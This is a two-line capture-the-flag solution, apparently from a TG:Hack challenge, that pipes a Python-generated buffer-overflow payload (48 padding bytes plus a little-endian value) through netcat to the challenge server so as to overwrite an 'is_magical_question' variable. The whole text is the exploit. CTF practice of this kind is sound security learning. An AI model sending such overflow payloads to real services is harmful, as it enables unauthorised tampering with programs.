# Overwrite the is_magical_question variable with the value 1
python -c 'print "A" * 48 + "\x01\x00\x00\x00"' | nc pwntion2.tghack.no 1062
